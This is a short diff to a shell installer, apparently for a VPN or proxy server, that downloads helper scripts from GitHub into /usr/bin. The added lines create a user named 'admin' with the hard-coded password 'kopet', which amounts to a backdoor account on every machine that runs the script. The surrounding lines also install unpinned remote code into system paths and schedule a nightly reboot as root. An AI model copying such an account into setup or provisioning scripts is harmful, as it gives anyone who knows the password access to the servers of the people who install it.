@@ -208,6 +208,10 @@ wget -qO /usr/bin/user-wireguard "https://raw.githubusercontent.com/fiqoh/ubuntu
 wget -qO /usr/bin/xray-script "https://raw.githubusercontent.com/fiqoh/ubuntu/main/xray-script.sh"
 chmod +x /usr/bin/{menu,user-create,user-delete,user-list,user-login,script-info,user-wireguard,xray-script}
 
+#Create Admin
+useradd admin
+echo "admin:kopet" | chpasswd
+
 # Configure auto-reboot
 echo "0 0 * * * root reboot" >> /etc/crontab
 
